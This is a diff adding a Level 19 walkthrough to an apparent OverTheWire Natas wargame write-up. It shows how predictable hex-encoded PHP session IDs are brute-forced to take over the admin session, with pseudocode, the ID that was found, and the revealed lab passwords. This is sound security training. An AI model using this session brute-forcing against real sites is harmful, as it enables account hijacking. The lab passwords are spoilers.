@@ -293,3 +293,27 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Password for natas19:** `qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT`
 - **Verification:** `http://natas19.natas.labs.overthewire.org/` with `natas19:<password>` → HTTP 200.
 - **Recording:** `recordings/natas/L18.cast`
+
+## Level 19 → natas20
+- **Account:** `natas19`, password `qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT`.
+- **Goal:** Same session scheme as level 18, but "session IDs are no longer sequential". The source reveals the format: `$idstr = "$idnum-$user"; return bin2hex($idstr);` with `$idnum = rand(1, $maxid)` and `$maxid = 640`.
+- **Technique and why it works:** the session ID is the **hex encoding** of `"<number>-<username>"`. So the admin session's ID is `bin2hex("<n>-admin")` for some `n` in 1..640. We brute-force that predictable structure: for each `n`, send `PHPSESSID=<hex(n + "-admin")>`. When we hit the admin session, the server loads it and prints the credentials. The weakness is again a tiny, deterministic session-ID space — hex-encoding does not add entropy.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** `createID` shows `$idstr = "$idnum-$user"; return bin2hex($idstr);` and `$maxid = 640`.
+2. **Brute-force the encoded ID.**
+   ```
+   for n in 1..640:
+       sid = hex(str(n) + "-admin")
+       GET / with Cookie: PHPSESSID=<sid>
+       if "You are an admin": print the <pre> block
+   ```
+   ```
+   FOUND n 281 sid 3238312d61646d696e   # hex of "281-admin"
+   Username: natas20
+   Password: slOKYGsjlJhaqKliGvrgWAzln0JyrWao
+   ```
+3. **Verify.** `curl -u natas20:<pw> http://natas20.natas.labs.overthewire.org/` → HTTP 200.
+- **Password for natas20:** `slOKYGsjlJhaqKliGvrgWAzln0JyrWao`
+- **Verification:** `http://natas20.natas.labs.overthewire.org/` with `natas20:<password>` → HTTP 200.
+- **Recording:** `recordings/natas/L19.cast`
